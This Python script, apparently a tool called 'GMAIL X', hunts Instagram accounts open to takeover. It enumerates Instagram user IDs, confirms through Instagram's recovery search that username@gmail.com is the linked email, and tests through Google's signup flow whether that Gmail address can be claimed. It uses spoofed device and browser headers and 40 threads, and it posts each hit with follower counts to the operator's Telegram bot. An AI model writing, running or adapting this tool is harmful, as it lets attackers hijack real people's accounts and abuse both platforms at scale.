import requests
import random
import threading
import os
import platform
import sys
import time
import json
import string
import base64
import secrets
import httpx
import uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import parse_qsl, urlencode
import html
import re
import user_agent
from datetime import datetime, timedelta, timezone
from cfonts import render

_C = lambda: random.sample(['red', 'cyan', 'green', 'yellow', 'blue', 'magenta', 'white'], 2)

b1 = '\033[1;32m'
z = '\033[1;31m'
white = '\033[1;37m'
RESET = '\033[0m'

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    clr()
    print('━' * 66)
    logo = render('AMAN', font='block', colors=_C(), align='center', background='black', space=True)
    print(logo)
    print('━' * 66)
    print(" GMAIL X v2.5                                          @foreshower ")
    print('━' * 66)

display_banner()
print(f" {white}Bot Token{RESET} : ", end="")
Token = input().strip()
print(f" {white}Chat ID{RESET}   : ", end="")
user_id = input().strip()
TELEGRAM_TOKEN = Token
TELEGRAM_CHAT_ID = user_id
time.sleep(1)
display_banner()

id_ranges = {
    1: (1682665388, 3382665388),  
    2: (2682665388, 5398785217), 
    3: (5398785217, 8682665388),  
    4: (7497939245, 10016232395), 
    5: (10016232396, 27238602159),
    6: (27238602160, 43464475395),
    7: (43464475396, 50289297647),
    8: (50289297648, 57464707082),
    9: (2682665388, 10016232395),
}

print(f" {b1}YEAR{RESET}")
print(f" {white}1{RESET} - 2015")
print(f" {white}2{RESET} - 2016")
print(f" {white}3{RESET} - 2017")
print(f" {white}4{RESET} - 2018")
print(f" {white}5{RESET} - 2019")
print(f" {white}6{RESET} - 2020")
print(f" {white}7{RESET} - 2021")
print(f" {white}8{RESET} - 2022")
print(f" {white}9{RESET} - BEST")
print(f" {b1}Year{RESET} [1-9] : ", end="")
year_mode = int(input())

clr()

def generate_user_id():
    start, end = id_ranges.get(year_mode, id_ranges[9])
    return str(random.randrange(start, end))

generated_count = 0
hit_count = 0
invalid_gmail = 0
invalid_email = 0
thread_lock = threading.Lock()
username_cache = {}

def log_to_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    for attempt in range(3):
        try:
            r = requests.post(url, json=payload, timeout=15)
            if r.status_code == 429:
                retry_after = r.json().get("parameters", {}).get("retry_after", 2)
                time.sleep(retry_after)
                continue
            if not r.ok:
                plain_text = re.sub(r'<[^>]+>', '', msg)
                requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": plain_text}, timeout=10)
            return True
        except Exception:
            time.sleep(1)
    return False

_stat_lock = threading.Lock()
_print_lock = threading.Lock()
current_email = ""


class Stat:
    def __init__(self):
        self.run = True
        self._started = False
        self._thread = threading.Thread(target=self._loop, daemon=True)

    def start(self):
        self._thread.start()

    def _line(self):
        with _stat_lock:
            top = f"{b1}HITS{RESET} {white}{hit_count}{RESET} | {z}BAD IG{RESET} {white}{invalid_email}{RESET} | {z}BAD MAIL{RESET} {white}{invalid_gmail}{RESET} | @{white}foreshower{RESET}"
        return top, ""

    def _loop(self):
        sys.stdout.write("\033[?25l")
        sys.stdout.flush()
        while self.run:
            with _print_lock:
                top, _ = self._line()
                if self._started:
                    sys.stdout.write("\033[2K\r" + top + "\r")
                else:
                    sys.stdout.write(top)
                    self._started = True
                sys.stdout.flush()
            time.sleep(0.3)
        sys.stdout.write("\033[?25h\r\n")
        sys.stdout.flush()


st = Stat()


def display_stats(email=""):
    global current_email
    with _stat_lock:
        current_email = email


def emit(text):
    with _print_lock:
        if st._started:
            sys.stdout.write("\033[2K\r\033[1B\033[2K\r\033[1A")
        sys.stdout.write(text + "\n")
        st._started = False
        sys.stdout.flush()

def username():
    while True:
        try:
            payload = {
                'jazoest': "2" + ''.join(random.choices(string.digits, k=4)),
                'lsd': "m" + base64.urlsafe_b64encode(secrets.token_bytes(19)).decode().rstrip("="),
                '__crn': 'comet.igweb.PolarisExploreSearchRoute',
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
                'server_timestamps': 'true',
                'variables': json.dumps({
                    "enable_integrity_filters": True,
                    "id": generate_user_id(),
                    "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
                    "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
                    "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
                    "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": True,
                    "__relay_internal__pv__PolarisShortDramaEnabledrelayprovider": False,
                    "__relay_internal__pv__PolarisLongformEnabledrelayprovider": False
                }, separators=(',', ':')),
                'doc_id': '38611279431804694'
            }

            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36",
                'x-csrftoken': base64.urlsafe_b64encode(secrets.token_bytes(24)).decode().rstrip("="),
                'x-fb-friendly-name': "PolarisProfilePageContentQuery",
                'x-ig-app-id': "1217981644879628",
                'x-asbd-id': "359341",
                'x-fb-lsd': payload["lsd"],
                'origin': "https://www.instagram.com",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'accept-language': "en-US",
                'priority': "u=1, i",
            }

            response = requests.post("https://www.instagram.com/api/graphql", data=payload, headers=headers, timeout=15).json()
            user_data = response.get('data', {}).get('user', {})
            username_str = user_data.get('username')
            if username_str:

                if '_' in username_str or len(username_str) < 5:
                    continue
                with thread_lock:
                    global generated_count
                    generated_count += 1
                    if len(username_cache) >= 400:
                        username_cache.clear()
                    username_cache[username_str] = user_data
                email = f"{username_str}@gmail.com"
                check_email_availability(email, username_str)

        except:
            pass

def check_gmail(email, username_str):
    global invalid_gmail
    session = requests.Session()
    tl = None
    at_token = None

    def get_tokens():
        nonlocal tl, at_token
        while True:
            session.headers.clear()
            ua = str(user_agent.generate_user_agent())
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'referer': 'https://accounts.google.com/', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'x-browser-channel': 'stable', 'x-browser-copyright': 'Copyright 2024 Google LLC. All rights reserved.', 'x-browser-year': '2024'}
            params = {'biz': 'false', 'continue': 'https://mail.google.com/mail/u/0/', 'ddm': '1', 'emr': '1', 'flowEntry': 'SignUp', 'flowName': 'GlifWebSignIn', 'followup': 'https://mail.google.com/mail/u/0/', 'osid': '1', 'service': 'mail'}
            try:
                r = session.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers, timeout=15)
                tl = r.url.split('TL=')[1]
                qzxixc = r.text.split('"Qzxixc":"')[1].split('"')[0]
                at_token = r.text.split('"SNlM0e":"')[1].split('"')[0]
                session.headers.update({'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'origin': 'https://accounts.google.com', 'referer': 'https://accounts.google.com/', 'user-agent': ua, 'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]', 'x-goog-ext-391502476-jspb': '["' + qzxixc + '"]', 'x-same-domain': '1'})
                break
            except:
                pass

    def signup_name():
        nonlocal tl, at_token
        while True:
            if not tl and not at_token:
                get_tokens()
            params = {'rpcids': 'E815hb', 'source-path': '/lifecycle/steps/signup/name', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
            data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randrange(5, 10))), at_token)
            try:
                r = session.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, data=data, timeout=15).text
                if "steps/signup/birthdaygender" in r:
                    break
            except:
                pass

    def signup_birthday():
        nonlocal tl, at_token
        while True:
            if not tl and not at_token:
                get_tokens()
            params = {'rpcids': 'eOY7Bb', 'source-path': '/lifecycle/steps/signup/birthdaygender', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22..%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(random.randrange(1990, 2007), random.randrange(1, 12), random.randrange(1, 28), at_token)
            try:
                r = session.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, data=data, timeout=15).text
                if 'steps/signup/username' in r:
                    break
            except:
                pass

    if '@' in email:
        email_prefix = email.split('@')[0]
    else:
        email_prefix = email
    if '..' in email_prefix or '_' in email_prefix or len(email_prefix) < 5 or len(email_prefix) > 30:
        with thread_lock:
            global invalid_email
            invalid_email += 1
        display_stats(email)
        with thread_lock:
            username_cache.pop(username_str, None)
        return
    if not tl and not at_token:
        get_tokens()
    signup_name()
    signup_birthday()
    params = {'rpcids': 'NHJMOd', 'source-path': '/lifecycle/steps/signup/username', 'hl': 'en-US', 'TL': tl, 'rt': 'c'}
    data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email_prefix, at_token)
    try:
        r = session.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', params=params, data=data).text
        if "steps/signup/password" in r:
            with thread_lock:
                global hit_count
                hit_count += 1
            fetch_instagram_profile(username_str, username_cache.get(username_str, {}))
            with thread_lock:
                username_cache.pop(username_str, None)
        else:
            with thread_lock:
                invalid_gmail += 1
            display_stats(email)
            with thread_lock:
                username_cache.pop(username_str, None)
    except:
        with thread_lock:
            invalid_gmail += 1
        display_stats(email)
        with thread_lock:
            username_cache.pop(username_str, None)

def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820"},
        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825"},
        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama"},
        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther"},
        {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893"},
        {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150"},
        {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845"},
        {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893"},
        {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980"},
    ]
    device = random.choice(devices)
    android_version = random.choice(["10", "11", "12", "13", "14"])
    api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
    dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
    width = random.choice(["720", "1080", "1440"])
    height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
    instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    locale = random.choice(["en_US", "en_GB", "ar_SA"])
    random_num = random.randint(300000000, 400000000)
    return f"Instagram {instagram_ver} Android ({api_level}/{android_version}; {dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; {device['device']}; {device['board']}; {locale}; {random_num})"

def get_account_creation_year(user_id):
    try:
        user_id_val = int(user_id)
        if 1629010001 <= user_id_val <= 2369359761:
            return 2015
        elif 2369359762 <= user_id_val <= 4239516754:
            return 2016
        elif 4239516755 <= user_id_val <= 6345108209:
            return 2017
        elif 6345108210 <= user_id_val <= 10016232395:
            return 2018
        elif 10016232396 <= user_id_val <= 27238602159:
            return 2019
        elif 27238602160 <= user_id_val <= 43464475395:
            return 2020
        elif 43464475396 <= user_id_val <= 50289297647:
            return 2021
        elif 50289297648 <= user_id_val <= 57464707082:
            return 2022
        else:
            return None
    except:
        return None

def api_headers():
    return {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.instagram.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "X-IG-App-ID": "936619743392459",
        "X-Requested-With": "XMLHttpRequest",
    }

def format_hit_slip(fn, u, fc, fwc, mc, ed, joined, private, rec="N/A"):
    joined_str = joined if joined else "N/A"
    private_str = "Yes" if private else "No"
    return f"""┏━━━━━━━━━━━━━━━━━━━━━━┓
⭐ PROFILE ⭐
┗━━━━━━━━━━━━━━━━━━━━━━┛

🏷️ Username        :  @{u}
🧑 Name            :  {fn}
📫 Email           :  {ed}
📉 Followers       :  {fc}
📤 Following       :  {fwc}
🗂️ Posts           :  {mc}
📅 Year            :  {joined_str}
🔓 Reset Email     :  {rec}
🔒 Private         :  {private_str}
🔗 Link            :  https://www.instagram.com/{u}

━━━━━━━━━━━━━━━━━━━━━━
💻 @foreshower
━━━━━━━━━━━━━━━━━━━━━━"""


def fetch_instagram_profile(username, user_data):
    try:
        with httpx.Client(http2=True, headers=api_headers(), timeout=6.0, follow_redirects=True) as session:
            response = session.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}", timeout=15)
            response.raise_for_status()
            data = response.json()
            api_user = data.get("user", data.get("data", {}).get("user", {}))

        followers_count = api_user.get('follower_count') or user_data.get('follower_count', 0)
        following_count = api_user.get('following_count') or user_data.get('following_count', 0)
        posts_count = (api_user.get('media_count')
                 or api_user.get('edge_owner_to_timeline_media', {}).get('count')
                 or user_data.get('media_count')
                 or user_data.get('all_media_count')
                 or 0)
        full_name = api_user.get('full_name') or user_data.get('full_name', 'N/A')
        bio_text = api_user.get('biography') or user_data.get('biography', 'N/A')
        user_id_val = api_user.get('id', user_data.get('id', user_data.get('pk', 'N/A')))
        is_private_account = api_user.get('is_private', user_data.get('is_private', False))
    except Exception:
        followers_count = user_data.get('follower_count', 0)
        following_count = user_data.get('following_count', 0)
        posts_count = user_data.get('media_count', 0)
        full_name = user_data.get('full_name', 'N/A')
        bio_text = user_data.get('biography', 'N/A')
        user_id_val = user_data.get('pk', 'N/A')
        is_private_account = user_data.get('is_private', False)

    email_domain = "gmail.com"
    safe_name = html.escape(str(full_name))
    safe_bio = html.escape(str(bio_text))
    safe_username = html.escape(str(username))


    slip = format_hit_slip(
        fn=safe_name,
        u=safe_username,
        fc=followers_count,
        fwc=following_count,
        mc=posts_count,
        ed=f"{safe_username}@{email_domain}",
        joined=get_account_creation_year(user_id_val),
        private=is_private_account,
        rec="N/A",
    )
    emit(slip)
    log_to_telegram(slip)

def build_ig_payload(search_query):
    device_id = str(uuid.uuid4())
    family_id = str(uuid.uuid4())
    android_id = "android-" + secrets.token_hex(8)
    params = {
        "client_input_params": {
            "search_query": search_query,
            "search_screen_type": "email_or_username",
            "ig_android_qe_device_id": device_id,
            "android_build_type": "release",
            "network_bssid": None, "zero_balance_state": None,
            "device_network_info": None, "cloud_trust_token": None,
            "ig_vetted_device_nonce": None, "encrypted_msisdn": "",
            "auth_secure_device_id": "", "sfdid": "",
            "headers_infra_flow_id": "", "text_input_id": "80j7q0:53",
            "was_headers_prefill_available": 0, "was_headers_prefill_used": 0,
            "is_oauth_without_permission": 0, "is_whatsapp_installed": 0,
        },
        "server_params": {
            "event_request_id": str(uuid.uuid4()),
            "waterfall_id": str(uuid.uuid4()),
            "device_id": android_id, "family_device_id": family_id,
            "qe_device_id": device_id,
            "INTERNAL__latency_qpl_instance_id": random.randint(40000000000000, 60000000000000),
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "login_surface": "login_home", "login_entry_point": "logged_out",
            "is_from_logged_out": 0, "is_platform_login": 0, "is_from_logged_in_switcher": 0,
        }
    }
    payload = {
        'params': json.dumps(params, separators=(',', ':')),
        'bk_client_context': '{"bloks_version":"dda8a25b49f5003a4b5be5546bb8ca6e9435a576c4cecf6a6f245f91eacc00ad","styles_id":"instagram"}',
        'bloks_versioning_id': 'dda8a25b49f5003a4b5be5546bb8ca6e9435a576c4cecf6a6f245f91eacc00ad',
    }
    headers = {
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-bloks-version-id': 'dda8a25b49f5003a4b5be5546bb8ca6e9435a576c4cecf6a6f245f91eacc00ad',
        'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
        'x-ig-android-id': android_id,
        'x-ig-app-id': '567067343352427',
        'x-ig-app-locale': 'en_US',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-connection-type': 'WIFI',
        'x-ig-device-id': device_id,
        'x-ig-device-locale': 'en_US',
        'x-ig-family-device-id': family_id,
        'x-ig-mapped-locale': 'en_US',
        'x-ig-timezone-offset': '-25200',
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': f'{time.time():.3f}',
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-1',
        'user-agent': generate_android_ua(),
    }
    return payload, headers

def check_email_availability(email, username_str):
    try:
        payload, headers = build_ig_payload(email)
        response = requests.post(
            'https://b.i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/',
            data=payload, headers=headers, timeout=15
        ).text
        if email in response:
            display_stats(email)
            if email.endswith("@gmail.com"):
                check_gmail(email, username_str)
        else:
            with thread_lock:
                global invalid_email
                invalid_email += 1
            display_stats(email)
            with thread_lock:
                username_cache.pop(username_str, None)
    except:
        with thread_lock:
            invalid_email += 1
        display_stats(email)
        with thread_lock:
            username_cache.pop(username_str, None)

def worker():
    while True:
        username()

if __name__ == "__main__":
    st.start()
    display_stats()
    with ThreadPoolExecutor(max_workers=40) as pool:
        for _ in range(40):
            pool.submit(worker)